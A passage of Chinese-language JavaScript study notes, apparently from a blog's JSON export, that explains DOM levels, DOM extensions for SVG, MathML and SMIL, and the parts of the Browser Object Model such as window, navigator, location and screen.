注：DOM0级其实不存在，仅作为一个参考，具体指的是最初支持的DHTML。 其他DOM标准：除了DOM核心和DOM HTML接口之外，另外的一些语言也针对DOM进行了定义，每种语言的DOM标准都添加了相关的新方法和接口，例如： SVG(Scalable Vector Graphic 可伸缩矢量图) 1.0 MathML(Mathematical Markup Language 数学标记语言) 1.0 SMIL(Synchronized Multimedia Integration Language 同步多媒体集成语言) 浏览器对象模型（BOM）开发者使用BOM（Browser Object Model）可以控制浏览器显示的页面意外的部分，如在HTML5中把很多BOM功能写入了正式规范中。 从根本上说，BOM只处理浏览器窗口和框架，但一般把所有针对浏览器的JS扩展都算作BOM的一部分，包括： 弹出新浏览器窗口的功能 移动、缩放、关闭浏览器窗口的功能 提供浏览器详细信息的navigator对象 提供浏览器所加载页面的详细信息的location对象 提供用户显示器分辨率详细信息的screen对象 对cookies的支持 像XMLHttpRequest和IE的ActiveXObject这样的自定义对象 由于BOM没有标准可遵循，因此每个浏览器可以有自己的实现，但存在一些事实标准，如window和navigator对象，每个浏览器都会为这两个对象及其他对象定义自己的属性和方法。而HTML5后，这些BOM的实现细节则越来越兼容了。","categories":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/categories/js/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"js-pro","slug":"js-pro","permalink":"https://github.com/xmoyKING/tags/js-pro/"}]}]}